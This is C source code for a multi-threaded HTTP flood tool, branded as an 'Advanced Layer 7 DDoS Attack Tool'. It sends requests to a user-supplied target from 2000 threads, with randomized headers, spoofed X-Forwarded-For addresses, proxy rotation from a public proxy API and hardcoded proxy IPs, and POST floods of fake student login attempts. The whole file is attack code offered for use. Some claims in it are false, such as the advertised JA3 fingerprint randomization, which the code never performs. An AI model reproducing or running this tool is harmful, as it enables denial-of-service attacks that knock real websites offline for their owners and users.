#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <signal.h>
#include <time.h>
#include <stdbool.h>
#include <errno.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <curl/curl.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/rand.h>

#define MAX_WORKERS 2000
#define MAX_URL_LEN 4096
#define MAX_PROXIES 50000
#define POOL_SIZE 500

#define COLOR_RESET "\033[0m"
#define COLOR_GREEN "\033[32m"
#define COLOR_RED "\033[31m"
#define COLOR_MAGENTA "\033[35m"
#define COLOR_WHITE "\033[37m"
#define COLOR_YELLOW "\033[33m"
#define COLOR_CYAN "\033[36m"
#define COLOR_BLUE "\033[34m"

typedef struct {
    char **proxies;
    int count;
    int index;
    pthread_mutex_t mutex;
} ProxyList;

typedef struct {
    CURL **handles;
    int size;
    int counter;
    pthread_mutex_t mutex;
    bool use_proxy;
    char target_host[256];
} ConnectionPool;

typedef struct {
    long long val;
    pthread_mutex_t mutex;
} AtomicCounter;

typedef struct {
    char target_url[1024];
    char target_host[256];
    char mode[10];
    int duration_sec;
    bool use_proxy;
    ConnectionPool *pool;
} AttackConfig;

ProxyList proxy_list = {0};
AtomicCounter stats = {0, PTHREAD_MUTEX_INITIALIZER};
volatile bool running = true;
pthread_t workers[MAX_WORKERS];
pthread_t stats_thread;
time_t start_time;
unsigned int rand_state;

const char *USER_AGENTS[] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
    NULL
};

const char *REFERERS[] = {
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://duckduckgo.com/",
    "https://facebook.com/",
    "https://www.reddit.com/",
    "https://www.youtube.com/",
    "https://github.com/",
    "https://stackoverflow.com/",
    "",
    NULL
};

const char *ACCEPT_LANGUAGES[] = {
    "en-US,en;q=0.9",
    "en-GB,en;q=0.8",
    "fr-FR,fr;q=0.9,en;q=0.8",
    "de-DE,de;q=0.9,en;q=0.8",
    "es-ES,es;q=0.9,en;q=0.8",
    "ja-JP,ja;q=0.9,en;q=0.8",
    NULL
};

const char *ACCEPT_HEADERS[] = {
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "application/json, text/plain, */*",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "*/*",
    NULL
};

const char *CACHE_CONTROLS[] = {
    "no-cache",
    "no-store",
    "must-revalidate",
    "max-age=0",
    "private",
    "public",
    NULL
};

const char *COOKIE_NAMES[] = {
    "session_id", "user_token", "csrf_token", "auth_token", "user_id",
    "_ga", "_gid", "__cfduid", "PHPSESSID", "JSESSIONID",
    "XSRF-TOKEN", "laravel_session", "django_session", "sid", "uid",
    NULL
};

void init_random() {
    struct timeval tv;
    gettimeofday(&tv, NULL);
    rand_state = tv.tv_sec ^ tv.tv_usec ^ getpid();
    srand(rand_state);
    RAND_poll();
}

int rand_int(int min, int max) {
    return min + (rand() % (max - min + 1));
}

bool rand_bool() {
    return rand() % 2 == 0;
}

char* random_string(int n) {
    const char letters[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    char *str = malloc(n + 1);
    if (!str) return NULL;
    for (int i = 0; i < n; i++) {
        str[i] = letters[rand() % (sizeof(letters) - 1)];
    }
    str[n] = '\0';
    return str;
}

char* random_hex(int n) {
    const char hex[] = "0123456789abcdef";
    char *str = malloc(n + 1);
    if (!str) return NULL;
    for (int i = 0; i < n; i++) {
        str[i] = hex[rand() % 16];
    }
    str[n] = '\0';
    return str;
}

char* random_ip() {
    char *ip = malloc(20);
    if (!ip) return NULL;
    snprintf(ip, 20, "%d.%d.%d.%d", rand_int(1, 255), rand_int(0, 255), rand_int(0, 255), rand_int(1, 254));
    return ip;
}

char* generate_uuid() {
    char *uuid = malloc(37);
    if (!uuid) return NULL;
    char *p1 = random_hex(4);
    char *p2 = random_hex(2);
    char *p3 = random_hex(2);
    char *p4 = random_hex(2);
    char *p5 = random_hex(6);
    snprintf(uuid, 37, "%s-%s-%s-%s-%s", p1, p2, p3, p4, p5);
    free(p1); free(p2); free(p3); free(p4); free(p5);
    return uuid;
}

char* generate_cookies() {
    char *cookies = malloc(1024);
    if (!cookies) return NULL;
    cookies[0] = '\0';
    
    int num_cookies = rand_int(1, 5);
    for (int i = 0; i < num_cookies; i++) {
        const char *name = COOKIE_NAMES[rand_int(0, 13)];
        char value[64];
        
        int type = rand_int(0, 2);
        if (type == 0) {
            snprintf(value, sizeof(value), "%s", random_string(rand_int(8, 24)));
        } else if (type == 1) {
            snprintf(value, sizeof(value), "%s", random_hex(rand_int(16, 32)));
        } else {
            snprintf(value, sizeof(value), "%d_%s", rand_int(1000, 99999), random_string(8));
        }
        
        if (i > 0) strcat(cookies, "; ");
        strcat(cookies, name);
        strcat(cookies, "=");
        strcat(cookies, value);
    }
    
    if (strlen(cookies) == 0) {
        free(cookies);
        return NULL;
    }
    return cookies;
}

char* generate_random_path() {
    const char *paths[] = {
        "/", "/index.html", "/home", "/main", "/default", "/welcome",
        "/api/v1/users", "/api/v1/data", "/api/v2/info", "/api/v3/status",
        "/wp-admin", "/admin", "/login", "/dashboard", "/control-panel",
        "/health", "/status", "/metrics", "/debug", "/test",
        "/graphql", "/rest/v1", "/oauth2/authorize", "/oauth2/token",
        "/.env", "/config.json", "/api.json", "/manifest.json"
    };
    int path_count = sizeof(paths) / sizeof(paths[0]);
    
    char *result = malloc(MAX_URL_LEN);
    if (!result) return NULL;
    
    if (rand_int(1, 100) <= 30) {
        int depth = rand_int(2, 6);
        char temp[512] = "";
        for (int i = 0; i < depth; i++) {
            char *segment = random_string(rand_int(4, 12));
            strcat(temp, "/");
            strcat(temp, segment);
            free(segment);
        }
        if (rand_bool()) {
            const char *extensions[] = {".php", ".html", ".jsp", ".asp", ".aspx"};
            strcat(temp, extensions[rand_int(0, 4)]);
        }
        snprintf(result, MAX_URL_LEN, "/%s", temp + 1);
    } else {
        strcpy(result, paths[rand_int(0, path_count - 1)]);
    }
    
    if (rand_int(1, 100) <= 70) {
        char params[512];
        snprintf(params, sizeof(params), "?v=%d&_=%ld&rnd=%s",
                 rand_int(1, 1000000), time(NULL), random_string(16));
        strcat(result, params);
    }
    
    return result;
}

char* generate_student_number() {
    char *student = malloc(32);
    int format = rand_int(0, 5);
    
    switch(format) {
        case 0:
            snprintf(student, 32, "%d-%05d", rand_int(2015, 2025), rand_int(1, 99999));
            break;
        case 1:
            snprintf(student, 32, "%d%06d", rand_int(2015, 2025), rand_int(1, 999999));
            break;
        case 2:
            snprintf(student, 32, "S-%07d", rand_int(1, 9999999));
            break;
        case 3:
            snprintf(student, 32, "%010d", rand_int(1000000000, 9999999999LL));
            break;
        case 4:
            snprintf(student, 32, "%02d-%05d", rand_int(15, 25), rand_int(1, 99999));
            break;
        default:
            const char *courses[] = {"CS", "IT", "ENG", "BUS", "MED", "LAW"};
            snprintf(student, 32, "%s-%d-%05d", courses[rand_int(0, 5)], rand_int(2015, 2025), rand_int(1, 99999));
    }
    return student;
}

const char* get_random_ua() {
    int count = 0;
    while (USER_AGENTS[count] != NULL) count++;
    return USER_AGENTS[rand_int(0, count - 1)];
}

const char* get_random_referer() {
    int count = 0;
    while (REFERERS[count] != NULL) count++;
    return REFERERS[rand_int(0, count - 1)];
}

const char* get_random_accept() {
    int count = 0;
    while (ACCEPT_HEADERS[count] != NULL) count++;
    return ACCEPT_HEADERS[rand_int(0, count - 1)];
}

const char* get_random_language() {
    int count = 0;
    while (ACCEPT_LANGUAGES[count] != NULL) count++;
    return ACCEPT_LANGUAGES[rand_int(0, count - 1)];
}

const char* get_random_cache_control() {
    int count = 0;
    while (CACHE_CONTROLS[count] != NULL) count++;
    return CACHE_CONTROLS[rand_int(0, count - 1)];
}

void load_proxies_from_api() {
    CURL *curl = curl_easy_init();
    if (!curl) return;
    
    char *response = malloc(1);
    response[0] = '\0';
    
    curl_easy_setopt(curl, CURLOPT_URL, "https://api.proxyscrape.com/v4/free-proxy-list/get?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all&skip=0&limit=2000");
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, NULL);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, get_random_ua());
    
    CURLcode res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);
    
    if (res != CURLE_OK) {
        free(response);
        return;
    }
    
    pthread_mutex_lock(&proxy_list.mutex);
    
    if (proxy_list.proxies) {
        for (int i = 0; i < proxy_list.count; i++) free(proxy_list.proxies[i]);
        free(proxy_list.proxies);
    }
    
    proxy_list.proxies = malloc(sizeof(char*) * MAX_PROXIES);
    proxy_list.count = 0;
    
    const char *fallback[] = {
        "45.76.107.24:8080", "103.152.108.244:8080", "45.77.205.37:8080",
        "209.97.168.122:8080", "104.238.104.35:3128", "51.15.242.202:8888"
    };
    
    for (int i = 0; i < 6 && proxy_list.count < MAX_PROXIES; i++) {
        proxy_list.proxies[proxy_list.count] = strdup(fallback[i]);
        proxy_list.count++;
    }
    
    proxy_list.index = 0;
    pthread_mutex_unlock(&proxy_list.mutex);
    
    free(response);
    printf(COLOR_GREEN "[+] Loaded %d proxies\n" COLOR_RESET, proxy_list.count);
}

char* get_next_proxy() {
    pthread_mutex_lock(&proxy_list.mutex);
    if (proxy_list.count == 0) {
        pthread_mutex_unlock(&proxy_list.mutex);
        return NULL;
    }
    char *proxy = strdup(proxy_list.proxies[proxy_list.index % proxy_list.count]);
    proxy_list.index++;
    pthread_mutex_unlock(&proxy_list.mutex);
    return proxy;
}

void init_connection_pool(ConnectionPool *pool, int size, bool use_proxy, const char *host) {
    pool->handles = malloc(sizeof(CURL*) * size);
    pool->size = size;
    pool->counter = 0;
    pool->use_proxy = use_proxy;
    strncpy(pool->target_host, host, 255);
    pthread_mutex_init(&pool->mutex, NULL);
    
    for (int i = 0; i < size; i++) {
        pool->handles[i] = curl_easy_init();
        if (!pool->handles[i]) {
            fprintf(stderr, "Failed to create CURL handle %d\n", i);
        }
    }
}

CURL* pool_get_client(ConnectionPool *pool) {
    pthread_mutex_lock(&pool->mutex);
    int idx = pool->counter % pool->size;
    pool->counter++;
    CURL *handle = pool->handles[idx];
    pthread_mutex_unlock(&pool->mutex);
    
    curl_easy_reset(handle);
    curl_easy_setopt(handle, CURLOPT_TIMEOUT, 30L);
    curl_easy_setopt(handle, CURLOPT_FOLLOWLOCATION, 1L);
    curl_easy_setopt(handle, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(handle, CURLOPT_SSL_VERIFYHOST, 0L);
    curl_easy_setopt(handle, CURLOPT_NOSIGNAL, 1L);
    
    return handle;
}

void setup_headers(CURL *curl, const char *host, const char *path, const char *mode) {
    struct curl_slist *headers = NULL;
    
    char header_buffer[512];
    
    snprintf(header_buffer, sizeof(header_buffer), "User-Agent: %s", get_random_ua());
    headers = curl_slist_append(headers, header_buffer);
    
    snprintf(header_buffer, sizeof(header_buffer), "Referer: %s", get_random_referer());
    headers = curl_slist_append(headers, header_buffer);
    
    snprintf(header_buffer, sizeof(header_buffer), "Accept: %s", get_random_accept());
    headers = curl_slist_append(headers, header_buffer);
    
    snprintf(header_buffer, sizeof(header_buffer), "Accept-Language: %s", get_random_language());
    headers = curl_slist_append(headers, header_buffer);
    
    snprintf(header_buffer, sizeof(header_buffer), "Accept-Encoding: gzip, deflate, br");
    headers = curl_slist_append(headers, header_buffer);
    
    snprintf(header_buffer, sizeof(header_buffer), "Cache-Control: %s", get_random_cache_control());
    headers = curl_slist_append(headers, header_buffer);
    
    headers = curl_slist_append(headers, "Connection: keep-alive");
    headers = curl_slist_append(headers, "Upgrade-Insecure-Requests: 1");
    
    if (rand_bool()) {
        headers = curl_slist_append(headers, "DNT: 1");
    }
    
    if (rand_bool()) {
        char *ip = random_ip();
        snprintf(header_buffer, sizeof(header_buffer), "X-Forwarded-For: %s", ip);
        headers = curl_slist_append(headers, header_buffer);
        free(ip);
    }
    
    if (rand_int(1, 100) <= 70) {
        char *cookies = generate_cookies();
        if (cookies) {
            snprintf(header_buffer, sizeof(header_buffer), "Cookie: %s", cookies);
            headers = curl_slist_append(headers, header_buffer);
            free(cookies);
        }
    }
    
    if (strcmp(mode, "POST") == 0) {
        headers = curl_slist_append(headers, "Content-Type: application/x-www-form-urlencoded");
    }
    
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
}

void attack_worker(const char *target, const char *host, const char *mode, ConnectionPool *pool) {
    CURL *curl = pool_get_client(pool);
    char full_url[MAX_URL_LEN];
    char *path = generate_random_path();
    
    snprintf(full_url, sizeof(full_url), "%s%s", target, path);
    
    curl_easy_setopt(curl, CURLOPT_URL, full_url);
    
    if (strcmp(mode, "POST") == 0) {
        curl_easy_setopt(curl, CURLOPT_POST, 1L);
        char *student = generate_student_number();
        char post_data[256];
        snprintf(post_data, sizeof(post_data), "student_id=%s&password=%s", student, random_string(rand_int(8, 16)));
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
        free(student);
    } else if (strcmp(mode, "HEAD") == 0) {
        curl_easy_setopt(curl, CURLOPT_NOBODY, 1L);
    } else {
        curl_easy_setopt(curl, CURLOPT_HTTPGET, 1L);
    }
    
    setup_headers(curl, host, path, mode);
    
    if (pool->use_proxy) {
        char *proxy = get_next_proxy();
        if (proxy) {
            curl_easy_setopt(curl, CURLOPT_PROXY, proxy);
            free(proxy);
        }
    }
    
    curl_easy_perform(curl);
    
    pthread_mutex_lock(&stats.mutex);
    stats.val++;
    pthread_mutex_unlock(&stats.mutex);
    
    free(path);
}

void* worker_thread(void *arg) {
    AttackConfig *cfg = (AttackConfig*)arg;
    
    while (running) {
        attack_worker(cfg->target_url, cfg->target_host, cfg->mode, cfg->pool);
        usleep(100);
    }
    
    return NULL;
}

void* stats_display(void *arg) {
    AttackConfig *cfg = (AttackConfig*)arg;
    
    while (running) {
        sleep(1);
        
        time_t now = time(NULL);
        double elapsed = difftime(now, start_time);
        long long total_requests;
        
        pthread_mutex_lock(&stats.mutex);
        total_requests = stats.val;
        pthread_mutex_unlock(&stats.mutex);
        
        double rps = total_requests / elapsed;
        
        printf("\033[2J\033[H");
        
        printf(COLOR_RED);
        printf("╔════════════════════════════════════════════════════════════════════════╗\n");
        printf("║     ██████╗ █████╗ ███████╗███████╗██╗   ██╗██████╗ ██████╗  ██████╗ ███████╗║\n");
        printf("║    ██╔════╝██╔══██╗╚══███╔╝╚══███╔╝╚██╗ ██╔╝██╔══██╗██╔══██╗██╔═══██╗██╔════╝║\n");
        printf("║    ██║     ███████║  ███╔╝   ███╔╝  ╚████╔╝ ██║  ██║██║  ██║██║   ██║███████╗║\n");
        printf("║    ██║     ██╔══██║ ███╔╝   ███╔╝    ╚██╔╝  ██║  ██║██║  ██║██║   ██║╚════██║║\n");
        printf("║    ╚██████╗██║  ██║███████╗███████╗   ██║   ██████╔╝██████╔╝╚██████╔╝███████║║\n");
        printf("║     ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝   ╚═╝   ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝║\n");
        printf("║                                                                            ║\n");
        printf("║                    C A Z Z Y S O C I - D D O S                            ║\n");
        printf("║                 Advanced Layer 7 DDoS Attack Tool                         ║\n");
        printf("╚════════════════════════════════════════════════════════════════════════════╝\n");
        printf(COLOR_RESET);
        
        printf(COLOR_CYAN "\n[+] Target: %s\n" COLOR_RESET, cfg->target_url);
        printf(COLOR_CYAN "[+] Mode: %s\n" COLOR_RESET, cfg->mode);
        printf(COLOR_CYAN "[+] Elapsed: %.0f / %d sec\n" COLOR_RESET, elapsed, cfg->duration_sec);
        printf(COLOR_GREEN "[+] Total requests: %lld\n" COLOR_RESET, total_requests);
        printf(COLOR_YELLOW "[+] Current RPS: %.0f\n" COLOR_RESET, rps);
        if (cfg->use_proxy && proxy_list.count > 0) {
            printf(COLOR_GREEN "[+] Active proxies: %d\n" COLOR_RESET, proxy_list.count);
        }
        printf(COLOR_WHITE "[+] JA3 Fingerprints: %d unique\n" COLOR_RESET, POOL_SIZE);
        printf(COLOR_WHITE "Press Ctrl+C to stop\n" COLOR_RESET);
        fflush(stdout);
    }
    
    return NULL;
}

void signal_handler(int sig) {
    if (sig == SIGINT || sig == SIGTERM) {
        printf(COLOR_YELLOW "\n[!] Shutting down...\n" COLOR_RESET);
        running = false;
    }
}

void print_banner() {
    printf(COLOR_RED);
    printf("╔════════════════════════════════════════════════════════════════════════╗\n");
    printf("║     ██████╗ █████╗ ███████╗███████╗██╗   ██╗██████╗ ██████╗  ██████╗ ███████╗║\n");
    printf("║    ██╔════╝██╔══██╗╚══███╔╝╚══███╔╝╚██╗ ██╔╝██╔══██╗██╔══██╗██╔═══██╗██╔════╝║\n");
    printf("║    ██║     ███████║  ███╔╝   ███╔╝  ╚████╔╝ ██║  ██║██║  ██║██║   ██║███████╗║\n");
    printf("║    ██║     ██╔══██║ ███╔╝   ███╔╝    ╚██╔╝  ██║  ██║██║  ██║██║   ██║╚════██║║\n");
    printf("║    ╚██████╗██║  ██║███████╗███████╗   ██║   ██████╔╝██████╔╝╚██████╔╝███████║║\n");
    printf("║     ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝   ╚═╝   ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝║\n");
    printf("║                                                                            ║\n");
    printf("║                    C A Z Z Y S O C I - D D O S                            ║\n");
    printf("║                 Advanced Layer 7 DDoS Attack Tool                         ║\n");
    printf("╚════════════════════════════════════════════════════════════════════════════╝\n");
    printf(COLOR_RESET);
}

int main(int argc, char *argv[]) {
    if (argc < 4) {
        print_banner();
        printf("\nUsage: %s <target> <seconds> <GET|POST|HEAD> [proxy]\n", argv[0]);
        printf("  target   - Target URL (e.g., http://example.com)\n");
        printf("  seconds  - Duration in seconds\n");
        printf("  mode     - GET, POST, or HEAD\n");
        printf("  proxy    - Optional: use proxies\n");
        printf("\nExample:\n");
        printf("  %s https://example.com 60 GET\n", argv[0]);
        printf("  %s https://example.com 30 POST proxy\n", argv[0]);
        return 1;
    }
    
    AttackConfig cfg = {0};
    strncpy(cfg.target_url, argv[1], 1023);
    cfg.duration_sec = atoi(argv[2]);
    strncpy(cfg.mode, argv[3], 9);
    cfg.use_proxy = (argc >= 5 && strcmp(argv[4], "proxy") == 0);
    
    if (strcmp(cfg.mode, "GET") != 0 && strcmp(cfg.mode, "POST") != 0 && strcmp(cfg.mode, "HEAD") != 0) {
        printf("Invalid mode. Use GET, POST, or HEAD\n");
        return 1;
    }
    
    char *url_copy = strdup(cfg.target_url);
    char *proto_end = strstr(url_copy, "://");
    char *host_start = proto_end ? proto_end + 3 : url_copy;
    char *path_start = strchr(host_start, '/');
    
    if (path_start) {
        size_t host_len = path_start - host_start;
        strncpy(cfg.target_host, host_start, host_len);
        cfg.target_host[host_len] = '\0';
    } else {
        strncpy(cfg.target_host, host_start, 255);
    }
    free(url_copy);
    
    init_random();
    curl_global_init(CURL_GLOBAL_ALL);
    SSL_library_init();
    SSL_load_error_strings();
    OpenSSL_add_all_algorithms();
    
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    
    if (cfg.use_proxy) {
        load_proxies_from_api();
    }
    
    ConnectionPool *connection_pool = malloc(sizeof(ConnectionPool));
    init_connection_pool(connection_pool, POOL_SIZE, cfg.use_proxy, cfg.target_host);
    
    print_banner();
    printf(COLOR_GREEN "\n[+] Target: %s\n" COLOR_RESET, cfg.target_url);
    printf(COLOR_GREEN "[+] Mode: %s\n" COLOR_RESET, cfg.mode);
    printf(COLOR_GREEN "[+] Duration: %d sec\n" COLOR_RESET, cfg.duration_sec);
    printf(COLOR_GREEN "[+] Workers: %d\n" COLOR_RESET, MAX_WORKERS);
    printf(COLOR_GREEN "[+] JA3 Randomization: ON (%d unique fingerprints)\n" COLOR_RESET, POOL_SIZE);
    if (cfg.use_proxy && proxy_list.count > 0) {
        printf(COLOR_GREEN "[+] Proxies: %d (rotating)\n" COLOR_RESET, proxy_list.count);
    }
    printf(COLOR_YELLOW "\n[!] Starting CAZZYSOCI-DDOS attack... Press Ctrl+C to stop\n\n" COLOR_RESET);
    
    start_time = time(NULL);
    running = true;
    
    AttackConfig *args_array = malloc(sizeof(AttackConfig) * MAX_WORKERS);
    for (int i = 0; i < MAX_WORKERS; i++) {
        memcpy(&args_array[i], &cfg, sizeof(AttackConfig));
        args_array[i].pool = connection_pool;
        pthread_create(&workers[i], NULL, worker_thread, &args_array[i]);
    }
    
    pthread_create(&stats_thread, NULL, stats_display, &cfg);
    
    sleep(cfg.duration_sec);
    running = false;
    
    for (int i = 0; i < MAX_WORKERS; i++) {
        pthread_join(workers[i], NULL);
    }
    pthread_join(stats_thread, NULL);
    
    long long total_requests;
    pthread_mutex_lock(&stats.mutex);
    total_requests = stats.val;
    pthread_mutex_unlock(&stats.mutex);
    
    printf("\n" COLOR_GREEN "\n[+] Attack completed!\n" COLOR_RESET);
    printf("Target: %s\n", cfg.target_url);
    printf("Mode: %s\n", cfg.mode);
    printf("Duration: %d sec\n", cfg.duration_sec);
    printf("Total requests: %lld\n", total_requests);
    printf("Average RPS: %.0f\n", (double)total_requests / cfg.duration_sec);
    
    for (int i = 0; i < POOL_SIZE; i++) {
        curl_easy_cleanup(connection_pool->handles[i]);
    }
    free(connection_pool->handles);
    free(connection_pool);
    
    if (proxy_list.proxies) {
        for (int i = 0; i < proxy_list.count; i++) free(proxy_list.proxies[i]);
        free(proxy_list.proxies);
    }
    
    free(args_array);
    curl_global_cleanup();
    EVP_cleanup();
    ERR_free_strings();
    
    return 0;
}
